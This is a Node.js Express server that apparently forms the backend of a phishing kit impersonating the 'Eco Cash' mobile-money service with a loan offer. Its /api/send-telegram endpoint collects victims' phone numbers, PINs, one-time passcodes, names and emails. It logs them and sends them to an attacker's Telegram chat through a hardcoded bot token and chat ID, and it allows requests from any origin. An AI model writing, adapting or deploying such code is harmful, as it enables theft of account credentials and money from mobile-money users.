const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// CORS - allow all origins
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Telegram notification endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, type } = req.body;
        
        console.log('📥 Received request:', { phone, pin, email, name, amount, term, type });
        
        // YOUR TELEGRAM CREDENTIALS
        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
        const TG_CHAT_ID = '8392790531';
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW PIN CONFIRMATION - Eco Cash 🔐\n\nPhone: ${phone}\nPIN: ${pin}\nEmail: ${email || 'Not provided'}\nName: ${name}\nLoan: $${amount} for ${term} months`;
        } else {
            message = `✅ NEW OTP VERIFICATION - Eco Cash ✅\n\nPhone: ${phone}\nOTP: ${pin}\nEmail: ${email || 'Not provided'}\nName: ${name}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Notification sent to Telegram:', result);
            res.json({ success: true, message: 'Notification sent' });
        } else {
            console.error('❌ Telegram API error:', result);
            res.status(500).json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('❌ Server error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Root route
app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'Eco Cash API is running!' });
});

app.listen(PORT, () => {
    console.log(`🚀 Eco Cash Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot configured`);
});
